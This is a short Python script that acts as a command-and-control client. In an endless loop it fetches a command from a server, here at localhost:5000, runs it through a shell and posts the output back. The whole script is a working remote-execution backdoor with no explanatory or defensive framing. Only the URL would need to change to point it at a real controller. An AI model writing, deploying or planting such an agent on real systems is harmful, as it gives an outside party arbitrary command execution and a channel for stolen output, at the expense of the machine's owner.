import time
import requests
import subprocess
from urllib import request, parse
URL = "http://localhost:5000"
def Ret(data):
    data = {"return": data}
    data = parse.urlencode(data).encode()
    req = request.Request(URL, data=data)
    request.urlopen(req)

def Get():
    return requests.get(URL).text
def Run(cmd):
    return subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).stdout.read()

while True:
    Ret(Run(Get()))




    time.sleep(1)
